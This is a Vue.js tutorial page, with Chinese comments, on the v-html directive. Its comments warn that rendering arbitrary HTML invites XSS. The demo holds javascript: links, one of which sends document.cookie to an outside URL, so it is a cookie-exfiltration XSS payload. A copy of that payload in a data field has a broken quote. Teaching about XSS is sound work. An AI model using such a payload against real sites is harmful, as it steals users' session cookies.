<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>2.v-html_指令</title>
		<link rel="icon" href="../img/favicon.ico" type="image/x-icon" />
		<script type="text/javascript" src="../js/vue.js"></script>
		<style></style>
	</head>
	<body>
		<!--
			v-html指令：
					1.作用：向指定节点中渲染包含html结构的内容。
					2.与插值语法的区别：
								(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
								(2).v-html可以识别html结构。
					3.严重注意：v-html有安全性问题！！！！
								(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
								(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
		<div id="root">
			<h2>name:{{name}}</h2>
			<br />
			<h2 v-html="styleName">name:{{styleName}}</h2>
			<a href="javascript:alert(1)">你好，输出1</a>
			<a href="javascript:location.href='https://github.com?'+document.cookie">你好，输出cookie</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false;

		const vm = new Vue({
			el: '#root',
			data: {
				name: 'Kaleus',
				styleName: '<h1>Kaleus</h1>',
				cookie: '<a href="javascript:location.href"https://github.com?"+document.cookie">你好，输出cookie</a>',
			},
			methods: {},
		});
	</script>
</html>
